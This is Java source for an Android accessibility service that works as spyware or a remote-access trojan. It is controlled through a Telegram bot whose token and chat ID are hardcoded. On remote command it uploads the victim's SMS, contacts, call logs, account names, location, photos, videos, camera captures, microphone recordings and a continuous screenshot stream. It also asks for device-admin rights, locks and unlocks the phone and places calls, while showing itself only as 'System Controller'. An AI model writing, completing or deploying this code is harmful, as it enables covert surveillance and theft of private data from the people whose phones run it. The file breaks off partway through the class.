package com.my.newproject3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.view.accessibility.AccessibilityEvent;
import android.view.Display;
import android.os.*;
import android.graphics.*;
import android.net.Uri;
import android.content.*;
import android.database.Cursor;
import android.provider.*;
import android.location.*;
import android.media.*;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.view.SurfaceView;
import android.accounts.AccountManager;
import android.accounts.Account;
import android.os.Build;
import android.app.admin.DevicePolicyManager;
import android.view.KeyEvent;
import android.app.KeyguardManager;
import android.app.NotificationManager;
import android.app.NotificationChannel;
import android.app.Notification;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.provider.Settings;
import android.net.wifi.WifiManager;
import android.bluetooth.BluetoothAdapter;
import android.media.MediaRecorder;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.media.MediaScannerConnection;
import android.preference.PreferenceManager;
import java.io.*;
import java.net.*;
import java.util.*;
import org.json.*;

public class MyAccessService extends AccessibilityService {
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isLive = false;
    private boolean isVideoStream = false;
    private boolean isRecording = false;
    private MediaRecorder mediaRecorder;
    private String audioPath;
    private long lastUpdateId = 0;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private AudioManager audioManager;
    private KeyguardManager keyguardManager;
    private TelephonyManager telephonyManager;
    private WifiManager wifiManager;
    private BluetoothAdapter bluetoothAdapter;
    private LocationManager locationManager;
    private NotificationManager notificationManager;
    private int streamCount = 0;
    private Timer cleanupTimer;
    private PowerManager.WakeLock wakeLock;
    private File screenshotFolder;
    private String deviceId;
    private String botToken;
    private String chatId;
    private SharedPreferences prefs;
    
    // التوكن الافتراضي (يتغير حسب الجهاز)
    private final String DEFAULT_BOT_TOKEN = "8541707577:AAHivkWH7RdHhKr8zXSuL_roy245LmNYyRo";
    private final String DEFAULT_CHAT_ID = "7259620384";
    
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            // تهيئة SharedPreferences
            prefs = PreferenceManager.getDefaultSharedPreferences(this);
            
            // الحصول على معرف الجهاز الفريد
            deviceId = getDeviceUniqueId();
            
            // الحصول على التوكن ورقم الشات المخزنين أو استخدام الافتراضي
            botToken = prefs.getString("bot_token_" + deviceId, DEFAULT_BOT_TOKEN);
            chatId = prefs.getString("chat_id_" + deviceId, DEFAULT_CHAT_ID);
            
            // إنشاء مجلد للصور المؤقتة
            screenshotFolder = new File(getCacheDir(), "screenshots_" + deviceId);
            if (!screenshotFolder.exists()) {
                screenshotFolder.mkdirs();
            }
            
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "System:KeepAlive_" + deviceId);
                wakeLock.acquire();
            }
            
            dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, MyAdminReceiver.class);
            audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
            telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            try {
                bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            } catch (Exception e) {}
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            
            createNotificationChannel();
            startCleanupTimer();
            
            // حفظ معرف الجهاز في السجلات
            saveDeviceInfo();
        } catch (Exception e) {}
    }
    
    // الحصول على معرف فريد للجهاز
    private String getDeviceUniqueId() {
        try {
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String deviceId = "";
            
            if (telephonyManager != null) {
                try {
                    deviceId = telephonyManager.getDeviceId();
                } catch (Exception e) {}
            }
            
            if (deviceId == null || deviceId.isEmpty()) {
                deviceId = androidId;
            }
            
            if (deviceId == null || deviceId.isEmpty()) {
                deviceId = Build.SERIAL;
            }
            
            if (deviceId == null || deviceId.isEmpty()) {
                deviceId = "DEVICE_" + System.currentTimeMillis();
            }
            
            return deviceId + "_" + Build.MODEL.replace(" ", "_");
        } catch (Exception e) {
            return "UNKNOWN_" + System.currentTimeMillis();
        }
    }
    
    private void saveDeviceInfo() {
        try {
            File deviceFile = new File(getFilesDir(), "device_info.json");
            JSONObject info = new JSONObject();
            info.put("device_id", deviceId);
            info.put("model", Build.MODEL);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("bot_token", botToken);
            info.put("chat_id", chatId);
            info.put("registered_at", System.currentTimeMillis());
            
            FileOutputStream fos = new FileOutputStream(deviceFile);
            fos.write(info.toString().getBytes());
            fos.close();
        } catch (Exception e) {}
    }
    
    private void startCleanupTimer() {
        cleanupTimer = new Timer();
        cleanupTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                cleanCache();
            }
        }, 3600000, 3600000);
    }
    
    private void cleanCache() {
        try {
            File cacheDir = getCacheDir();
            File[] files = cacheDir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isFile() && file.exists()) {
                        file.delete();
                    }
                }
            }
            if (screenshotFolder != null && screenshotFolder.exists()) {
                File[] screenshots = screenshotFolder.listFiles();
                if (screenshots != null) {
                    for (File file : screenshots) {
                        if (file.isFile() && file.exists()) {
                            file.delete();
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }
    
    private void createNotificationChannel() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel("control_" + deviceId, "System Control " + deviceId.substring(0, Math.min(8, deviceId.length())), NotificationManager.IMPORTANCE_LOW);
                if (notificationManager != null) {
                    notificationManager.createNotificationChannel(channel);
                }
                Notification notification = new Notification.Builder(this, "control_" + deviceId)
                    .setContentTitle("System Controller")
                    .setContentText("Device: " + deviceId.substring(0, Math.min(16, deviceId.length())))
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setOngoing(true)
                    .build();
                startForeground(1, notification);
            } else {
                Notification notification = new Notification.Builder(this)
                    .setContentTitle("System Controller")
                    .setContentText("Device: " + deviceId.substring(0, Math.min(16, deviceId.length())))
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build();
                startForeground(1, notification);
            }
        } catch (Exception e) {}
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}
    
    @Override
    public void onInterrupt() {}
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendMessage("✅ الجهاز متصل");
                sendMessage("🆔 معرف الجهاز: " + deviceId);
                sendMessage("🤖 البوت: " + botToken.substring(0, Math.min(20, botToken.length())) + "...");
                sendMenu();
            }
        }).start();
        startCommandLoop();
        
        if (!dpm.isAdminActive(adminComponent)) {
            try {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {}
        }
    }
    
    private void startCommandLoop() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkCommands();
                handler.postDelayed(this, 1000);
            }
        }, 1000);
    }
    
    private void checkCommands() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL("https://api.telegram.org/bot" + botToken + "/getUpdates?offset=" + (lastUpdateId + 1));
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(5000);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) response.append(line);
                    reader.close();
                    conn.disconnect();
                    
                    JSONObject json = new JSONObject(response.toString());
                    JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        long updateId = update.getLong("update_id");
                        if (updateId > lastUpdateId) {
                            lastUpdateId = updateId;
                            String command = "";
                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                if (message.has("text")) {
                                    command = message.getString("text");
                                }
                            } else if (update.has("callback_query")) {
                                command = update.getJSONObject("callback_query").getString("data");
                            }
                            if (!command.isEmpty()) {
                                executeCommand(command);
                            }
                        }
                    }
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void executeCommand(String command) {
        try {
            if (command.equals("/start") || command.equals("/menu")) {
                sendMenu();
            }
            else if (command.equals("device_id")) sendMessage("🆔 معرف الجهاز:\n" + deviceId);
            else if (command.equals("set_bot")) {
                sendMessage("📝 أرسل التوكن الجديد بهذا التنسيق:\n/set_bot TOKEN CHAT_ID\nمثال:\n/set_bot 123456:ABCdef 123456789");
            }
            else if (command.startsWith("/set_bot ")) {
                updateBotConfig(command);
            }
            else if (command.equals("info")) sendMessage(getInfo());
            else if (command.equals("location")) sendMessage(getLocation());
            else if (command.equals("sms")) sendMessage(getSMS());
            else if (command.equals("contacts")) sendMessage(getContacts());
            else if (command.equals("calls")) sendMessage(getCalls());
            else if (command.equals("accounts")) sendMessage(getAccounts());
            else if (command.equals("photos")) getPhotos(10);
            else if (command.equals("videos")) getVideos(10);
            else if (command.equals("camera")) takePhoto(0);
            else if (command.equals("camera_front")) takePhoto(1);
            else if (command.equals("files")) listFiles("/storage/emulated/0/");
            else if (command.equals("record")) startRecord();
            else if (command.equals("stop")) stopRecord();
            else if (command.equals("live")) startLiveStreaming();
            else if (command.equals("live_stop")) stopLiveStreaming();
            else if (command.equals("video_stream")) startVideoStream();
            else if (command.equals("video_stop")) stopVideoStream();
            else if (command.equals("lock")) lockPhone();
            else if (command.equals("unlock")) unlockPhone();
            else if (command.equals("call")) makeCall();
            else if (command.equals("web")) openWeb();
            else if (command.equals("home")) performGlobalAction(GLOBAL_ACTION_HOME);
            else if (command.equals("back")) performGlobalAction(GLOBAL_ACTION_BACK);
            else if (command.equals("volume_up")) volumeUp();
            else if (command.equals("volume_down")) volumeDown();
            else if (command.equals("screenshot")) takeScreenshot();
            else if (command.equals("wifi_on")) wifiOn();
            else if (command.equals("wifi_off")) wifiOff();
            else if (command.equals("bluetooth_on")) bluetoothOn();
            else if (command.equals("bluetooth_off")) bluetoothOff();
            else if (command.equals("battery")) getBattery();
            else if (command.equals("reboot")) reboot();
            
        } catch (Exception e) {
            sendMessage("⚠️ خطأ: " + e.getMessage());
        }
    }
    
    private void updateBotConfig(String command) {
        try {
            String[] parts = command.split(" ");
            if (parts.length >= 3) {
                String newToken = parts[1];
                String newChatId = parts[2];
                
                // اختبار الاتصال بالبوت الجديد
                URL testUrl = new URL("https://api.telegram.org/bot" + newToken + "/getMe");
                HttpURLConnection conn = (HttpURLConnection) testUrl.openConnection();
                conn.setConnectTimeout(5000);
                int responseCode = conn.getResponseCode();
                conn.disconnect();
                
                if (responseCode == 200) {
                    // حفظ الإعدادات الجديدة
                    SharedPreferences.Editor editor = prefs.edit();
                    editor.putString("bot_token_" + deviceId, newToken);
                    editor.putString("chat_id_" + deviceId, newChatId);
                    editor.apply();
                    
                    botToken = newToken;
                    chatId = newChatId;
                    lastUpdateId = 0; // إعادة تعيين آخر تحديث
                    
                    sendMessage("✅ تم تحديث إعدادات البوت بنجاح!");
                    sendMessage("🤖 البوت الجديد: " + newToken.substring(0, Math.min(20, newToken.length())) + "...");
                    sendMessage("📱 الشات الجديد: " + newChatId);
                    saveDeviceInfo();
                } else {
                    sendMessage("❌ فشل الاتصال بالبوت. تأكد من التوكن");
                }
            } else {
                sendMessage("⚠️ التنسيق غير صحيح\nاستخدم: /set_bot TOKEN CHAT_ID");
            }
        } catch (Exception e) {
            sendMessage("❌ خطأ: " + e.getMessage());
        }
    }
    
    private void sendMenu() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String text = "🔰 لوحة التحكم\n🆔 الجهاز: " + deviceId.substring(0, Math.min(20, deviceId.length())) + "\n\nاختر الأمر:";
                    String buttons = "{\"inline_keyboard\":[" +
                        "[{\"text\":\"🆔 معرف الجهاز\",\"callback_data\":\"device_id\"},{\"text\":\"🤖 تغيير البوت\",\"callback_data\":\"set_bot\"}]," +
                        "[{\"text\":\"📱 معلومات\",\"callback_data\":\"info\"},{\"text\":\"📍 موقع\",\"callback_data\":\"location\"}]," +
                        "[{\"text\":\"✉️ رسائل\",\"callback_data\":\"sms\"},{\"text\":\"👤 جهات\",\"callback_data\":\"contacts\"}]," +
                        "[{\"text\":\"📞 مكالمات\",\"callback_data\":\"calls\"},{\"text\":\"🔑 حسابات\",\"callback_data\":\"accounts\"}]," +
                        "[{\"text\":\"🖼️ صور\",\"callback_data\":\"photos\"},{\"text\":\"🎥 فيديوهات\",\"callback_data\":\"videos\"}]," +
                        "[{\"text\":\"📸 كاميرا\",\"callback_data\":\"camera\"},{\"text\":\"🎥 بث مباشر\",\"callback_data\":\"live\"}]," +
                        "[{\"text\":\"📹 بث فيديو\",\"callback_data\":\"video_stream\"},{\"text\":\"⏹️ إيقاف\",\"callback_data\":\"live_stop\"}]," +
                        "[{\"text\":\"📁 ملفات\",\"callback_data\":\"files\"},{\"text\":\"🎤 تسجيل\",\"callback_data\":\"record\"}]," +
                        "[{\"text\":\"🔒 قفل\",\"callback_data\":\"lock\"},{\"text\":\"🔓 فتح\",\"callback_data\":\"unlock\"}]," +
                        "[{\"text\":\"🏠 رئيسية\",\"callback_data\":\"home\"},{\"text\":\"🔙 رجوع\",\"callback_data\":\"back\"}]," +
                        "[{\"text\":\"🔊 صوت+\",\"callback_data\":\"volume_up\"},{\"text\":\"🔉 صوت-\",\"callback_data\":\"volume_down\"}]," +
                        "[{\"text\":\"📸 لقطة\",\"callback_data\":\"screenshot\"},{\"text\":\"📡 واي فاي\",\"callback_data\":\"wifi_on\"}]," +
                        "[{\"text\":\"🔋 بطارية\",\"callback_data\":\"battery\"},{\"text\":\"🔄 إعادة تشغيل\",\"callback_data\":\"reboot\"}]]}";
                    
                    String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + Uri.encode(text) + "&reply_markup=" + Uri.encode(buttons);
                    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setConnectTimeout(10000);
                    conn.getInputStream();
                    conn.disconnect();
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void sendMessage(final String text) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + Uri.encode(text);
                    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setConnectTimeout(10000);
                    conn.getInputStream();
                    conn.disconnect();
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void sendFileToBot(final String filePath, final String caption) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                int retryCount = 0;
                while (retryCount < 3) {
                    try {
                        File file = new File(filePath);
                        if (!file.exists() || file.length() == 0) {
                            return;
                        }
                        
                        URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setDoOutput(true);
                        conn.setDoInput(true);
                        conn.setUseCaches(false);
                        conn.setRequestMethod("POST");
                        conn.setConnectTimeout(30000);
                        conn.setReadTimeout(30000);
                        
                        String boundary = "*****";
                        conn.setRequestProperty("Connection", "Keep-Alive");
                        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                        
                        DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                        
                        dos.writeBytes("--" + boundary + "\r\n");
                        dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                        dos.writeBytes(chatId + "\r\n");
                        
                        dos.writeBytes("--" + boundary + "\r\n");
                        dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\n");
                        dos.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                        
                        FileInputStream fis = new FileInputStream(file);
                        byte[] buffer = new byte[8192];
                        int read;
                        while ((read = fis.read(buffer)) != -1) {
                            dos.write(buffer, 0, read);
                        }
                        fis.close();
                        dos.writeBytes("\r\n");
                        
                        if (caption != null && !caption.isEmpty()) {
                            dos.writeBytes("--" + boundary + "\r\n");
                            dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                            dos.writeBytes(caption + "\r\n");
                        }
                        
                        dos.writeBytes("--" + boundary + "--\r\n");
                        dos.flush();
                        dos.close();
                        
                        int responseCode = conn.getResponseCode();
                        if (responseCode == 200) {
                            conn.getInputStream();
                            conn.disconnect();
                            return;
                        }
                        conn.disconnect();
                        
                    } catch (Exception e) {}
                    retryCount++;
                    try { Thread.sleep(1000); } catch (Exception e) {}
                }
            }
        }).start();
    }
    
    private void sendDocumentToBot(final String filePath) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    File file = new File(filePath);
                    if (!file.exists() || file.length() == 0) return;
                    
                    URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendDocument");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(30000);
                    conn.setReadTimeout(30000);
                    
                    String boundary = "*****";
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                    
                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                    
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                    dos.writeBytes(chatId + "\r\n");
                    
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
                    dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                    
                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[8192];
                    int read;
                    while ((read = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, read);
                    }
                    fis.close();
                    
                    dos.writeBytes("\r\n--" + boundary + "--\r\n");
                    dos.flush();
                    dos.close();
                    
                    conn.getInputStream();
                    conn.disconnect();
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void captureAndSaveScreen() {
        try {
            String timestamp = String.valueOf(System.currentTimeMillis());
            final String filePath = screenshotFolder.getAbsolutePath() + "/screen_" + timestamp + ".jpg";
            
            try {
                java.lang.Process process = Runtime.getRuntime().exec("screencap -p " + filePath);
                int exitCode = process.waitFor();
                
                if (exitCode == 0) {
                    File file = new File(filePath);
                    if (file.exists() && file.length() > 0) {
                        compressImage(filePath);
                        sendFileToBot(filePath, "📸 لقطة شاشة");
                        streamCount++;
                        return;
                    }
                }
            } catch (Exception e) {}
            
            try {
                java.lang.Process process = Runtime.getRuntime().exec("screencap");
                DataInputStream dis = new DataInputStream(process.getInputStream());
                byte[] data = new byte[dis.available()];
                dis.readFully(data);
                dis.close();
                
                Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                if (bitmap != null && bitmap.getWidth() > 0) {
                    FileOutputStream fos = new FileOutputStream(filePath);
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos);
                    fos.close();
                    bitmap.recycle();
                    
                    sendFileToBot(filePath, "📸 لقطة شاشة");
                    streamCount++;
                    return;
                }
            } catch (Exception e) {}
            
        } catch (Exception e) {}
    }
    
    private void compressImage(String filePath) {
        try {
            File file = new File(filePath);
            if (file.length() > 500000) {
                Bitmap bitmap = BitmapFactory.decodeFile(filePath);
                if (bitmap != null) {
                    int newWidth = bitmap.getWidth() / 2;
                    int newHeight = bitmap.getHeight() / 2;
                    Bitmap scaled = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
                    bitmap.recycle();
                    
                    FileOutputStream fos = new FileOutputStream(filePath);
                    scaled.compress(Bitmap.CompressFormat.JPEG, 60, fos);
                    fos.close();
                    scaled.recycle();
                }
            }
        } catch (Exception e) {}
    }
    
    private void startLiveStreaming() {
        isLive = true;
        streamCount = 0;
        sendMessage("🎥 بدء البث المباشر - سيتم إرسال لقطة كل ثانية");
        startLiveStream();
    }
    
    private void stopLiveStreaming() {
        isLive = false;
        sendMessage("🛑 إيقاف البث المباشر - تم إرسال " + streamCount + " لقطة");
    }
    
    private void startLiveStream() {
        if (!isLive) return;
        try {
            captureAndSaveScreen();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    startLiveStream();
                }
            }, 1000);
        } catch (Exception e) {}
    }
    
    private void startVideoStream() {
        isVideoStream = true;
        streamCount = 0;
        sendMessage("📹 بدء بث الفيديو - سيتم إرسال لقطة كل 10 ثواني");
        startVideoRecording();
    }
    
    private void stopVideoStream() {
        isVideoStream = false;
        sendMessage("🛑 إيقاف بث الفيديو - تم إرسال " + streamCount + " لقطة");
    }
    
    private void startVideoRecording() {
        if (!isVideoStream) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    captureAndSaveScreen();
                    Thread.sleep(10000);
                    if (isVideoStream) {
                        startVideoRecording();
                    }
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void takeScreenshot() {
        captureAndSaveScreen();
    }
    
    private String getInfo() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        int battery = 0;
        if (bm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        }
        return "📱 " + Build.MANUFACTURER + " " + Build.MODEL + 
               "\n🔋 " + battery + "%" + 
               "\n📡 Android " + Build.VERSION.RELEASE +
               "\n🆔 " + deviceId;
    }
    
    private String getLocation() {
        try {
            if (locationManager != null) {
                Location loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc == null) {
                    loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }
                if (loc != null) {
                    return "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                }
            }
        } catch (Exception e) {}
        return "غير متاح";
    }
    
    private String getSMS() {
        StringBuilder sb = new StringBuilder("📩 آخر الرسائل:\n\n");
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), 
                new String[]{"address", "body"}, null, null, "date DESC LIMIT 5");
            if (c != null) {
                while (c.moveToNext()) {
                    sb.append("📱 من: ").append(c.getString(0)).append("\n");
                    sb.append("📝 ").append(c.getString(1)).append("\n\n");
                }
                c.close();
            }
        } catch (Exception e) {}
        return sb.toString();
    }
    
    private String getContacts() {
        StringBuilder sb = new StringBuilder("👤 جهات الاتصال:\n\n");
        try {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null);
            if (c != null) {
                int count = 0;
                while (c.moveToNext() && count < 15) {
                    sb.append("👤 ").append(c.getString(0)).append("\n");
                    sb.append("📞 ").append(c.getString(1)).append("\n\n");
                    count++;
                }
                c.close();
            }
        } catch (Exception e) {}
        return sb.toString();
    }
    
    private String getCalls() {
        StringBuilder sb = new StringBuilder("📞 سجل المكالمات:\n\n");
        try {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE}, null, null, "date DESC LIMIT 5");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(0);
                    int type = c.getInt(1);
                    String t = type == 1 ? "📞 وارد" : (type == 2 ? "📱 صادر" : "❌ فائت");
                    sb.append(t).append(": ").append(num).append("\n");
                }
                c.close();
            }
        } catch (Exception e) {}
        return sb.toString();
    }
    
    private String getAccounts() {
        StringBuilder sb = new StringBuilder("👤 الحسابات:\n\n");
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccounts();
            for (Account acc : accounts) {
                sb.append("• ").append(acc.name).append("\n");
            }
        } catch (Exception e) {}
        return sb.toString();
    }
    
    private void getPhotos(final int limit) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        new String[]{MediaStore.Images.Media.DATA}, null, null,
                        MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT " + limit);
                    if (c != null) {
                        int sent = 0;
                        while (c.moveToNext() && sent < limit) {
                            String path = c.getString(0);
                            if (path != null && new File(path).exists()) {
                                sendFileToBot(path, "🖼️ صورة");
                                sent++;
                                try { Thread.sleep(500); } catch (Exception e) {}
                            }
                        }
                        c.close();
                        sendMessage("✅ تم إرسال " + sent + " صورة");
                    }
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void getVideos(final int limit) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Cursor c = getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        new String[]{MediaStore.Video.Media.DATA}, null, null,
                        MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT " + limit);
                    if (c != null) {
                        int sent = 0;
                        while (c.moveToNext() && sent < limit) {
                            String path = c.getString(0);
                            if (path != null && new File(path).exists()) {
                                sendDocumentToBot(path);
                                sent++;
                                try { Thread.sleep(800); } catch (Exception e) {}
                            }
                        }
                        c.close();
                        sendMessage("✅ تم إرسال " + sent + " فيديو");
                    }
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void takePhoto(final int id) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Camera cam = Camera.open(id);
                    if (cam == null) return;
                    SurfaceView sv = new SurfaceView(getApplicationContext());
                    cam.setPreviewDisplay(sv.getHolder());
                    cam.startPreview();
                    cam.takePicture(null, null, new PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            try {
                                String filePath = screenshotFolder.getAbsolutePath() + "/photo_" + System.currentTimeMillis() + ".jpg";
                                FileOutputStream fos = new FileOutputStream(filePath);
                                fos.write(data);
                                fos.close();
                                camera.stopPreview();
                                camera.release();
                                sendFileToBot(filePath, "📸 صورة من الكاميرا");
                                sendMessage("📸 تم التصوير");
                            } catch (Exception e) {}
                        }
                    });
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void listFiles(final String path) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    File dir = new File(path);
                    if (!dir.exists()) return;
                    File[] files = dir.listFiles();
                    if (files == null) return;
                    StringBuilder sb = new StringBuilder("📁 " + path + "\n\n");
                    for (int i = 0; i < Math.min(30, files.length); i++) {
                        sb.append(files[i].isDirectory() ? "📁 " : "📄 ");
                        sb.append(files[i].getName());
                        if (!files[i].isDirectory()) {
                            sb.append(" (").append(files[i].length() / 1024).append("KB)");
                        }
                        sb.append("\n");
                    }
                    sendMessage(sb.toString());
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void startRecord() {
        if (isRecording) return;
        try {
            audioPath = screenshotFolder.getAbsolutePath() + "/record_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendMessage("🎤 بدء التسجيل");
        } catch (Exception e) {}
    }
    
    private void stopRecord() {
        if (!isRecording) return;
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
            sendDocumentToBot(audioPath);
            sendMessage("⏹️ تم إيقاف التسجيل");
        } catch (Exception e) {}
    }
    
    private void lockPhone() {
        try {
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow();
                sendMessage("🔒 تم القفل");
            }
        } catch (Exception e) {}
    }
    
    private void unlockPhone() {
        try {
            if (keyguardManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    keyguardManager.requestDismissKeyguard(null, null);
                } else {
                    KeyguardManager.KeyguardLock lock = keyguardManager.newKeyguardLock("unlock");
                    lock.disableKeyguard();
                }
                sendMessage("🔓 تم الفتح");
            }
        } catch (Exception e) {}
    }
    
    private void makeCall() {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:07700000000"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void openWeb() {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("https://www.google.com"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void volumeUp() {
        try {
            audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
            sendMessage("🔊 رفع الصوت");
        } catch (Exception e) {}
    }
    
    private void volumeDown() {
        try {
            audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
            sendMessage("🔉 خفض الصوت");
        } catch (Exception e) {}
    }
    
